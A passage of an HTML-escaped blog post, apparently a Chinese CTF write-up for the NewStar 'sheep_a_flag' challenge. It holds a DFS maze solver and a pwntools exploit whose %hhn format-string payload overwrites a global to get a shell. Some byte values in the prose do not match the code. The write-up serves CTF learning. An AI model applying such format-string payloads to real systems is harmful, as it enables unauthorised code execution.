class=\"number\">0</span> <span class=\"keyword\">and</span> <span class=\"built_in\">map</span>[x][y-<span class=\"number\">1</span>]!=<span class=\"number\">0</span> <span class=\"keyword\">and</span> v[x][y-<span class=\"number\">1</span>]!=<span class=\"number\">1</span>:</span><br><span class=\"line\">  v[x][y-<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">  dfs(res+<span class=\"string\">&#x27;a&#x27;</span>,x,y-<span class=\"number\">1</span>)</span><br><span class=\"line\">  v[x][y-<span class=\"number\">1</span>]=<span class=\"number\">0</span></span><br><span class=\"line\"> <span class=\"keyword\">if</span> y&lt;<span class=\"number\">23</span> <span class=\"keyword\">and</span> <span class=\"built_in\">map</span>[x][y+<span class=\"number\">1</span>]!=<span class=\"number\">0</span> <span class=\"keyword\">and</span> v[x][y+<span class=\"number\">1</span>]!=<span class=\"number\">1</span>:</span><br><span class=\"line\">  v[x][y+<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">  dfs(res+<span class=\"string\">&#x27;d&#x27;</span>,x,y+<span class=\"number\">1</span>)</span><br><span class=\"line\">  v[x][y+<span class=\"number\">1</span>]=<span class=\"number\">0</span></span><br><span class=\"line\"> <span class=\"keyword\">if</span> x&lt;<span class=\"number\">23</span> <span class=\"keyword\">and</span> <span class=\"built_in\">map</span>[x+<span class=\"number\">1</span>][y]!=<span class=\"number\">0</span> <span class=\"keyword\">and</span> v[x+<span class=\"number\">1</span>][y]!=<span class=\"number\">1</span>:</span><br><span class=\"line\">  v[x+<span class=\"number\">1</span>][y]=<span class=\"number\">1</span></span><br><span class=\"line\">  dfs(res+<span class=\"string\">&#x27;s&#x27;</span>,x+<span class=\"number\">1</span>,y)</span><br><span class=\"line\">  v[x+<span class=\"number\">1</span>][y]=<span class=\"number\">0</span></span><br><span class=\"line\"> <span class=\"keyword\">return</span> </span><br><span class=\"line\"></span><br><span class=\"line\">sheep_x=-<span class=\"number\">1</span></span><br><span class=\"line\">sheep_y=-<span class=\"number\">1</span></span><br><span class=\"line\">flag_x=-<span class=\"number\">1</span></span><br><span class=\"line\">flag_y=-<span class=\"number\">1</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;position!\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#遍历获取地图</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">24</span>):</span><br><span class=\"line\"> x=[]</span><br><span class=\"line\"> y=[]</span><br><span class=\"line\"> a=p.recvline().decode(<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\"> <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">24</span>):</span><br><span class=\"line\">  y.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">  <span class=\"keyword\">if</span> a[j]==<span class=\"string\">&quot;🈲&quot;</span>.decode(<span class=\"string\">&quot;utf-8&quot;</span>):</span><br><span class=\"line\">   x.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">  <span class=\"keyword\">if</span> a[j]==<span class=\"string\">&#x27;⬛&#x27;</span>.decode(<span class=\"string\">&quot;utf-8&quot;</span>):</span><br><span class=\"line\">   x.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">  <span class=\"keyword\">if</span> a[j]==<span class=\"string\">&#x27;⬜&#x27;</span>.decode(<span class=\"string\">&quot;utf-8&quot;</span>):</span><br><span class=\"line\">   x.append(<span class=\"number\">1</span>)</span><br><span class=\"line\">  <span class=\"keyword\">if</span> a[j]==<span class=\"string\">&#x27;🐏&#x27;</span>.decode(<span class=\"string\">&quot;utf-8&quot;</span>):</span><br><span class=\"line\">   x.append(<span class=\"number\">2</span>)</span><br><span class=\"line\">   sheep_x=i</span><br><span class=\"line\">   sheep_y=j</span><br><span class=\"line\">  <span class=\"keyword\">if</span> a[j]==<span class=\"string\">&#x27;🚩&#x27;</span>.decode(<span class=\"string\">&quot;utf-8&quot;</span>):</span><br><span class=\"line\">   x.append(<span class=\"number\">3</span>)</span><br><span class=\"line\">   flag_x=i</span><br><span class=\"line\">   flag_y=j</span><br><span class=\"line\"> <span class=\"built_in\">map</span>.append(x)</span><br><span class=\"line\"> v.append(y)</span><br><span class=\"line\">dfs(<span class=\"string\">&#x27;&#x27;</span>,sheep_x,sheep_y)</span><br></pre></td></tr></table></figure>\n\n<p>后面就是一个格式化字符串漏洞</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 __fastcall <span class=\"title function_\">vuln</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v0; <span class=\"comment\">// rbp</span></span><br><span class=\"line\"></span><br><span class=\"line\">  read(<span class=\"number\">0</span>, (<span class=\"type\">void</span> *)(v0 - <span class=\"number\">0x60</span>), <span class=\"number\">0x50</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>((<span class=\"type\">const</span> <span class=\"type\">char</span> *)(v0 - <span class=\"number\">0x60</span>));            <span class=\"comment\">// 格式化字符串漏洞，修改0x602080为1919810即0x1D4B42</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ *(_QWORD *)(v0 - <span class=\"number\">8</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>0x602080写入0x42，0x602081写入0x4d，0x602082写入0x1d，使用hhn每次写入1字节，从小到大写，先0x602082，再0x602080，最后写0x602080。计算一下三个地址是第几个参数，写入内容8byte对齐后，使用%c来输出一些字节凑数即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#overwrite 0x602080 to 0x1D4B42</span></span><br><span class=\"line\"><span class=\"comment\">#0x1D(29) to 0x602082</span></span><br><span class=\"line\"><span class=\"comment\">#0x42(+37) to 0x602080</span></span><br><span class=\"line\"><span class=\"comment\">#0x4B(+9) to 0x602081</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#start from 6</span></span><br><span class=\"line\"><span class=\"comment\">#9 + 9 + 8 + 0x18</span></span><br><span class=\"line\"><span class=\"comment\">#26=&gt;0x18+2=&gt;+2 +2 +2=&gt;0x20=&gt;+4=&gt;6+4=10</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;%29c%10$hhn&#x27;</span>+<span class=\"string\">&#x27;%37c%11$hhn&#x27;</span>+<span class=\"string\">&#x27;%9c%12$hhn&#x27;</span>+p64(<span class=\"number\">0x602082</span>)+p64(<span class=\"number\">0x602080</span>)+p64(<span class=\"number\">0x602081</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: UTF-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;node4.buuoj.cn&#x27;,27884)</span></span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./sheep_a_flag&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">\tgdb.attach(p,cmd)</span><br><span class=\"line\">\tpause()</span><br><span class=\"line\"></span><br><span class=\"line\">ans=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">v=[]</span><br><span class=\"line\"><span class=\"built_in\">map</span>=[]</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dfs</span>(<span class=\"params\">res,x,y</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> ans</span><br><span class=\"line\">\t<span class=\"comment\">#print(x,y,flag_x,flag_y,res,sep=&#x27; &#x27;)</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> x==flag_x <span class=\"keyword\">and</span> y==flag_y:</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&#x27;you&#x27;</span>)</span><br><span class=\"line\">\t\tans=res</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> x&gt;<span class=\"number\">0</span> <span class=\"keyword\">and</span> <span class=\"built_in\">map</span>[x-<span class=\"number\">1</span>][y]!=<span class=\"number\">0</span> <span class=\"keyword\">and</span> v[x-<span class=\"number\">1</span>][y]!=<span class=\"number\">1</span>:</span><br><span class=\"line\">\t\tv[x-<span class=\"number\">1</span>][y]=<span class=\"number\">1</span></span><br><span class=\"line\">\t\tdfs(res+<span class=\"string\">&#x27;w&#x27;</span>,x-<span class=\"number\">1</span>,y)</span><br><span class=\"line\">\t\tv[x-<span class=\"number\">1</span>][y]=<span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> y&gt;<span class=\"number\">0</span> <span class=\"keyword\">and</span> <span class=\"built_in\">map</span>[x][y-<span class=\"number\">1</span>]!=<span class=\"number\">0</span> <span class=\"keyword\">and</span> v[x][y-<span class=\"number\">1</span>]!=<span class=\"number\">1</span>:</span><br><span class=\"line\">\t\tv[x][y-<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">\t\tdfs(res+<span class=\"string\">&#x27;a&#x27;</span>,x,y-<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\tv[x][y-<span class=\"number\">1</span>]=<span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> y&lt;<span class=\"number\">23</span> <span class=\"keyword\">and</span> <span class=\"built_in\">map</span>[x][y+<span class=\"number\">1</span>]!=<span class=\"number\">0</span> <span class=\"keyword\">and</span> v[x][y+<span class=\"number\">1</span>]!=<span class=\"number\">1</span>:</span><br><span class=\"line\">\t\tv[x][y+<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">\t\tdfs(res+<span class=\"string\">&#x27;d&#x27;</span>,x,y+<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\tv[x][y+<span class=\"number\">1</span>]=<span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> x&lt;<span class=\"number\">23</span> <span class=\"keyword\">and</span> <span class=\"built_in\">map</span>[x+<span class=\"number\">1</span>][y]!=<span class=\"number\">0</span> <span class=\"keyword\">and</span> v[x+<span class=\"number\">1</span>][y]!=<span class=\"number\">1</span>:</span><br><span class=\"line\">\t\tv[x+<span class=\"number\">1</span>][y]=<span class=\"number\">1</span></span><br><span class=\"line\">\t\tdfs(res+<span class=\"string\">&#x27;s&#x27;</span>,x+<span class=\"number\">1</span>,y)</span><br><span class=\"line\">\t\tv[x+<span class=\"number\">1</span>][y]=<span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> </span><br><span class=\"line\"></span><br><span class=\"line\">sheep_x=-<span class=\"number\">1</span></span><br><span class=\"line\">sheep_y=-<span class=\"number\">1</span></span><br><span class=\"line\">flag_x=-<span class=\"number\">1</span></span><br><span class=\"line\">flag_y=-<span class=\"number\">1</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;position!\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">24</span>):</span><br><span class=\"line\">\tx=[]</span><br><span class=\"line\">\ty=[]</span><br><span class=\"line\">\ta=p.recvline().decode(<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">24</span>):</span><br><span class=\"line\">\t\ty.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> a[j]==<span class=\"string\">&quot;🈲&quot;</span>.decode(<span class=\"string\">&quot;utf-8&quot;</span>):</span><br><span class=\"line\">\t\t\tx.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> a[j]==<span class=\"string\">&#x27;⬛&#x27;</span>.decode(<span class=\"string\">&quot;utf-8&quot;</span>):</span><br><span class=\"line\">\t\t\tx.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> a[j]==<span class=\"string\">&#x27;⬜&#x27;</span>.decode(<span class=\"string\">&quot;utf-8&quot;</span>):</span><br><span class=\"line\">\t\t\tx.append(<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> a[j]==<span class=\"string\">&#x27;🐏&#x27;</span>.decode(<span class=\"string\">&quot;utf-8&quot;</span>):</span><br><span class=\"line\">\t\t\tx.append(<span class=\"number\">2</span>)</span><br><span class=\"line\">\t\t\tsheep_x=i</span><br><span class=\"line\">\t\t\tsheep_y=j</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> a[j]==<span class=\"string\">&#x27;🚩&#x27;</span>.decode(<span class=\"string\">&quot;utf-8&quot;</span>):</span><br><span class=\"line\">\t\t\tx.append(<span class=\"number\">3</span>)</span><br><span class=\"line\">\t\t\tflag_x=i</span><br><span class=\"line\">\t\t\tflag_y=j</span><br><span class=\"line\">\t<span class=\"built_in\">map</span>.append(x)</span><br><span class=\"line\">\tv.append(y)</span><br><span class=\"line\">dfs(<span class=\"string\">&#x27;&#x27;</span>,sheep_x,sheep_y)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Ans: \\n&#x27;</span>)</span><br><span class=\"line\">p.sendline(ans)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;it ?!\\n&#x27;</span>)</span><br><span class=\"line\">debug(<span class=\"string\">&#x27;b *0x4011c3&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#overwrite 0x602080 to 0x1D4B42</span></span><br><span class=\"line\"><span class=\"comment\">#0x1D(29) to 0x602082</span></span><br><span class=\"line\"><span class=\"comment\">#0x42(+37) to 0x602080</span></span><br><span class=\"line\"><span class=\"comment\">#0x4B(+9) to 0x602081</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#start from 6</span></span><br><span class=\"line\"><span class=\"comment\">#9 + 9 + 8 + 0x18</span></span><br><span class=\"line\"><span class=\"comment\">#26=&gt;0x18+2=&gt;+2 +2 +2=&gt;0x20=&gt;+4=&gt;6+4=10</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;%29c%10$hhn&#x27;</span>+<span class=\"string\">&#x27;%37c%11$hhn&#x27;</span>+<span class=\"string\">&#x27;%9c%12$hhn&#x27;</span>+p64(<span class=\"number\">0x602082</span>)+p64(<span class=\"number\">0x602080</span>)+p64(<span class=\"number\">0x602081</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<p>NewStar CTF 的整活题，考格式化字符串还有走迷宫的算法。</p>\n<p>走迷宫，如果能够走出去，就能够跳转到一个格式化字符串漏洞，利用该漏洞将0x602080中的内容修改为1919810即可get shell。</p>","more":"<p>走迷宫：(DFS)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">v=[]</span><br><span class=\"line\"><span class=\"built_in\">map</span>=[]</span><br><span class=\"line\"><span class=\"comment\">#深度优先回溯法走迷宫</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dfs</span>(<span class=\"params\">res,x,y</span>):</span><br><span class=\"line\"> <span class=\"keyword\">global</span> ans</span><br><span class=\"line\"> <span class=\"comment\">#print(x,y,flag_x,flag_y,res,sep=&#x27; &#x27;)</span></span><br><span class=\"line\"> <span class=\"keyword\">if</span> x==flag_x <span class=\"keyword\">and</span> y==flag_y:</span><br><span class=\"line\">  <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;you&#x27;</span>)</span><br><span class=\"line\">  ans=res</span><br><span class=\"line\">  <span class=\"keyword\">return</span></span><br><span class=\"line\"> <span class=\"keyword\">if</span> x&gt;<span class=\"number\">0</span> <span class=\"keyword\">and</span> <span class=\"built_in\">map</span>[x-<span class=\"number\">1</span>][y]!=<span class=\"number\">0</span> <span class=\"keyword\">and</span> v[x-<span class=\"number\">1</span>][y]!=<span class=\"number\">1</span>:</span><br><span class=\"line\">  v[x-<span class=\"number\">1</span>][y]=<span class=\"number\">1</span></span><br><span class=\"line\">  dfs(res+<span class=\"string\">&#x27;w&#x27;</span>,x-<span class=\"number\">1</span>,y)</span><br><span class=\"line\">  v[x-<span class=\"number\">1</span>][y]=<span class=\"number\">0</span></span><br><span class=\"line\"> <span class=\"keyword\">if</span> y&gt;<span class=\"number\">0</span> <span class=\"keyword\">and</span> <span class=\"built_in\">map</span>[x][y-<span class=\"number\">1</span>]!=<span class=\"number\">0</span> <span class=\"keyword\">and</span> v[x][y-<span class=\"number\">1</span>]!=<span class=\"number\">1</span>:</span><br><span class=\"line\">  v[x][y-<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">  dfs(res+<span class=\"string\">&#x27;a&#x27;</span>,x,y-<span class=\"number\">1</span>)</span><br><span class=\"line\">  v[x][y-<span class=\"number\">1</span>]=<span class=\"number\">0</span></span><br><span class=\"line\"> <span class=\"keyword\">if</span> y&lt;<span class=\"number\">23</span> <span class=\"keyword\">and</span> <span class=\"built_in\">map</span>[x][y+<span class=\"number\">1</span>]!=<span class=\"number\">0</span> <span class=\"keyword\">and</span> v[x][y+<span class=\"number\">1</span>]!=<span class=\"number\">1</span>:</span><br><span class=\"line\">  v[x][y+<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">  dfs(res+<span class=\"string\">&#x27;d&#x27;</span>,x,y+<span class=\"number\">1</span>)</span><br><span class=\"line\">  v[x][y+<span class=\"number\">1</span>]=<span class=\"number\">0</span></span><br><span class=\"line\"> <span class=\"keyword\">if</span> x&lt;<span class=\"number\">23</span> <span class=\"keyword\">and</span> <span class=\"built_in\">map</span>[x+<span class=\"number\">1</span>][y]!=<span class=\"number\">0</span> <span class=\"keyword\">and</span> v[x+<span class=\"number\">1</span>][y]!=<span class=\"number\">1</span>:</span><br><span class=\"line\">  v[x+<span class=\"number\">1</span>][y]=<span class=\"number\">1</span></span><br><span class=\"line\">  dfs(res+<span class=\"string\">&#x27;s&#x27;</span>,x+<span class=\"number\">1</span>,y)</span><br><span class=\"line\">  v[x+<span class=\"number\">1</span>][y]=<span class=\"number\">0</span></span><br><span class=\"line\"> <span class=\"keyword\">return</span> </span><br><span class=\"line\"></span><br><span class=\"line\">sheep_x=-<span class=\"number\">1</span></span><br><span class=\"line\">sheep_y=-<span class=\"number\">1</span></span><br><span class=\"line\">flag_x=-<span class=\"number\">1</span></span><br><span class=\"line\">flag_y=-<span class=\"number\">1</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;position!\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#遍历获取地图</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">24</span>):</span><br><span class=\"line\"> x=[]</span><br><span class=\"line\"> y=[]</span><br><span class=\"line\"> a=p.recvline().decode(<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\"> <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">24</span>):</span><br><span class=\"line\">  y.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">  <span class=\"keyword\">if</span> a[j]==<span class=\"string\">&quot;🈲&quot;</span>.decode(<span class=\"string\">&quot;utf-8&quot;</span>):</span><br><span class=\"line\">   x.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">  <span class=\"keyword\">if</span> a[j]==<span class=\"string\">&#x27;⬛&#x27;</span>.decode(<span class=\"string\">&quot;utf-8&quot;</span>):</span><br><span class=\"line\">   x.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">  <span class=\"keyword\">if</span> a[j]==<span class=\"string\">&#x27;⬜&#x27;</span>.decode(<span class=\"string\">&quot;utf-8&quot;</span>):</span><br><span class=\"line\">   x.append(<span class=\"number\">1</span>)</span><br><span class=\"line\">  <span class=\"keyword\">if</span> a[j]==<span class=\"string\">&#x27;🐏&#x27;</span>.decode(<span class=\"string\">&quot;utf-8&quot;</span>):</span><br><span class=\"line\">   x.append(<span class=\"number\">2</span>)</span><br><span class=\"line\">   sheep_x=i</span><br><span class=\"line\">   sheep_y=j</span><br><span class=\"line\">  <span class=\"keyword\">if</span> a[j]==<span class=\"string\">&#x27;🚩&#x27;</span>.decode(<span class=\"string\">&quot;utf-8&quot;</span>):</span><br><span class=\"line\">   x.append(<span class=\"number\">3</span>)</span><br><span class=\"line\">   flag_x=i</span><br><span class=\"line\">   flag_y=j</span><br><span class=\"line\"> <span class=\"built_in\">map</span>.append(x)</span><br><span class=\"line\"> v.append(y)</span><br><span class=\"line\">dfs(<span class=\"string\">&#x27;&#x27;</span>,sheep_x,sheep_y)</span><br></pre></td></tr></table></figure>\n\n<p>后面就是一个格式化字符串漏洞</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 __fastcall <span class=\"title function_\">vuln</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v0; <span class=\"comment\">// rbp</span></span><br><span class=\"line\"></span><br><span class=\"line\">  read(<span class=\"number\">0</span>, (<span class=\"type\">void</span> *)(v0 - <span class=\"number\">0x60</span>), <span class=\"number\">0x50</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>((<span class=\"type\">const</span> <span class=\"type\">char</span> *)(v0 - <span class=\"number\">0x60</span>));            <span class=\"comment\">// 格式化字符串漏洞，修改0x602080为1919810即0x1D4B42</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ *(_QWORD *)(v0 - <span class=\"number\">8</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>0x602080写入0x42，0x602081写入0x4d，0x602082写入0x1d，使用hhn每次写入1字节，从小到大写，先0x602082，再0x602080，最后写0x602080。计算一下三个地址是第几个参数，写入内容8byte对齐后，使用%c来输出一些字节凑数即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#overwrite 0x602080 to 0x1D4B42</span></span><br><span class=\"line\"><span class=\"comment\">#0x1D(29) to 0x602082</span></span><br><span class=\"line\"><span class=\"comment\">#0x42(+37) to 0x602080</span></span><br><span class=\"line\"><span class=\"comment\">#0x4B(+9) to 0x602081</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#start from 6</span></span><br><span class=\"line\"><span class=\"comment\">#9 + 9 + 8 + 0x18</span></span><br><span class=\"line\"><span class=\"comment\">#26=&gt;0x18+2=&gt;+2 +2 +2=&gt;0x20=&gt;+4=&gt;6+4=10</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;%29c%10$hhn&#x27;</span>+<span class=\"string\">&#x27;%37c%11$hhn&#x27;</span>+<span class=\"string\">&#x27;%9c%12$hhn&#x27;</span>+p64(<span class=\"number\">0x602082</span>)+p64(<span class=\"number\">0x602080</span>)+p64(<span class=\"number\">0x602081</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span 